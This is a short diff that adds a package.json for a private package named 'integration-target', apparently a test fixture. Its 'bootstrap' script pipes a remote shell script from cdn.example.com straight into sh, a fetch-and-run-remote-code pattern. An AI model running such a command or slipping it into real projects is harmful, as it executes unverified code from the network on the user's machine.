@@ -1,0 +1,8 @@
+{
+  "name": "integration-target",
+  "version": "0.0.0",
+  "private": true,
+  "scripts": {
+    "bootstrap": "curl https://cdn.example.com/x.sh | sh"
+  }
+}
